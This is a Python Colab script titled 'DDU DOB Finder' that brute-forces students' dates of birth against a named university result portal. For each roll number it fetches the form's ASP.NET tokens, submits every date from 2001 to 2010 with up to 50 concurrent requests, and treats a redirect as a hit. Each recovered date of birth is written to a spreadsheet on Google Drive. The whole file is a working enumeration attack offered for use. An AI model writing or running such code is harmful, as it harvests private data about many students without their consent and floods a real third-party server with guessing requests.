from google.colab import drive
import os

# Mount Google Drive
drive.mount('/content/drive', force_remount=True)

import nest_asyncio
nest_asyncio.apply()

import asyncio
import aiohttp
from aiohttp import ClientSession
from datetime import datetime, timedelta
from tqdm.auto import tqdm
import pandas as pd
import re

# Constants
DRIVE_PATH = "/content/drive/MyDrive/DDU_Results/"
os.makedirs(DRIVE_PATH, exist_ok=True)

def extract_form_data(html):
    viewstate = re.search(r'id="__VIEWSTATE" value="([^"]+)"', html)
    eventvalidation = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', html)
    viewstategenerator = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', html)
    if not all([viewstate, eventvalidation, viewstategenerator]):
        return None
    return {
        "__VIEWSTATE": viewstate.group(1),
        "__EVENTVALIDATION": eventvalidation.group(1),
        "__VIEWSTATEGENERATOR": viewstategenerator.group(1),
    }

def generate_dates_interleaved(years, month=None):
    dates = []
    if month:
        for day in range(1, 32):
            for y in years:
                try:
                    date = datetime(y, month, day)
                    dates.append(date.strftime('%Y-%m-%d'))
                except ValueError:
                    continue
    else:
        start_dates = {y: datetime(y, 1, 1) for y in years}
        end_dates = {y: datetime(y, 12, 31) for y in years}
        current = start_dates.copy()
        while True:
            finished = True
            for y in years:
                if current[y] <= end_dates[y]:
                    dates.append(current[y].strftime('%Y-%m-%d'))
                    current[y] += timedelta(days=1)
                    finished = False
            if finished:
                break
    return dates

async def try_dob(session, roll_no, semester, date_of_birth, semaphore):
    url = "https://ddugorakhpur.com/result2023/searchresult_new.aspx"
    async with semaphore:
        try:
            async with session.get(url) as resp:
                html = await resp.text()
            form_data = extract_form_data(html)
            if not form_data:
                return None
            form_data.update({
                "ddlsem": semester,
                "txtRollno": roll_no,
                "txtDob": date_of_birth,
                "btnSearch": "Search Result"
            })
            async with session.post(url, data=form_data, allow_redirects=False) as response:
                if response.status == 302:
                    return date_of_birth
        except Exception:
            return None
    return None

async def fetch_for_roll(session, roll_no, semester, priority_groups, month_filter, semaphore, results, results_lock, roll_pbar, filename):
    roll_str = str(roll_no).zfill(6)

    for years in priority_groups:
        dates = generate_dates_interleaved(years, month_filter)
        with tqdm(total=len(dates), desc=f"DOBs for {roll_str}", leave=False, position=1, dynamic_ncols=True) as date_pbar:
            for dob in dates:
                result = await try_dob(session, roll_str, semester, dob, semaphore)
                date_pbar.update(1)
                if result:
                    async with results_lock:
                        results.append({'Roll Number': roll_no, 'Semester': semester, 'Date of Birth': result})
                        pd.DataFrame(results).to_excel(filename, index=False)
                    roll_pbar.update(1)
                    return
    # If not found
    async with results_lock:
        results.append({'Roll Number': roll_no, 'Semester': semester, 'Date of Birth': "N.A."})
        pd.DataFrame(results).to_excel(filename, index=False)
    roll_pbar.update(1)

async def run_custom_roll_search(roll_numbers, semester, month_filter):
    priority_groups = [[2001,2002,2003,2004,2005,2006,2007,2008,2009,2010]]
    filename = os.path.join(DRIVE_PATH, f"ddu_custom_results.xlsx")

    if os.path.exists(filename):
        existing_df = pd.read_excel(filename)
        completed_rolls = set(existing_df["Roll Number"].astype(int))
        print(f"🔁 Resuming... {len(completed_rolls)} already done.")
    else:
        existing_df = pd.DataFrame()
        completed_rolls = set()

    remaining_rolls = [rn for rn in roll_numbers if rn not in completed_rolls]
    results = existing_df.to_dict(orient="records")
    results_lock = asyncio.Lock()

    connector = aiohttp.TCPConnector(limit=100)
    semaphore = asyncio.Semaphore(50)

    async with ClientSession(connector=connector) as session:
        with tqdm(total=len(remaining_rolls), desc="📦 Roll Numbers Done", position=0, dynamic_ncols=True) as roll_pbar:
            tasks = [
                fetch_for_roll(session, rn, semester, priority_groups, month_filter, semaphore, results, results_lock, roll_pbar, filename)
                for rn in remaining_rolls
            ]
            await asyncio.gather(*tasks)

    print(f"\n✅ Results saved to: {filename}")

def run_custom_main():
    print("🎯 Custom Roll Search | DDU DOB Finder")
    try:
        roll_input = input("Enter Roll Numbers (comma separated): ").strip()
        roll_numbers = list(map(int, roll_input.split(',')))
        semester = input("Enter Semester (1-8): ").strip()
        month = input("Enter specific month to search (1-12 or blank for all months): ").strip()
        month_filter = int(month) if month.isdigit() and 1 <= int(month) <= 12 else None
        asyncio.run(run_custom_roll_search(roll_numbers, semester, month_filter))
    except Exception as e:
        print(f"❌ Error: {e}")

# 🚀 Launch
run_custom_main()

#2515075160
